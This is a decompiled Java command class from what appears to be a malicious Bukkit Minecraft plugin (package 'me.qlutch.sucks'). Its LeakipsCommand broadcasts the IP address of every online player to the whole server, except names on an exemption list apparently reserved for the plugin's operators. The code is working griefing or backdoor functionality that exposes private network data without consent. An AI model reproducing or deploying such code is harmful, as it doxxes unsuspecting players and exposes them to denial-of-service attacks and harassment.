/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class LeakipsCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        for (Player a2 : Bukkit.getOnlinePlayers()) {
            if (plugin.lite.contains(a2.getName())) continue;
            Bukkit.broadcastMessage((String) Settings.PREFIX(a2.getName() + "'s IP: " + a2.getAddress().getHostString()));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

